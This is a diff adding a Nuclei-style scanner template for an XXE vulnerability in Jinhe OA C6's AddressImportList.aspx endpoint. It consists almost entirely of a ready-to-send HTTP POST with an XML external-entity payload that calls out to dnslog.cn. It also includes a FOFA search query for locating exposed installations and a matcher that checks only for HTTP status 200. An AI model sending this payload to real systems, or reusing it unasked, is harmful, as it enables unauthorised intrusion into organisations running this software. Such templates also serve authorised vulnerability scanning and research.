@@ -1,0 +1,36 @@
+id: poc-syq49zwkq4e23z4y
+info:
+  name: 金和OA_C6 AddressImportList存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/syq49zwkq4e23z4y'
+  tags: xxe,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: syq49zwkq4e23z4y
+    fofa: app="金和网络-金和 OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+    Content-Length: 139
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://dnslog.cn/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
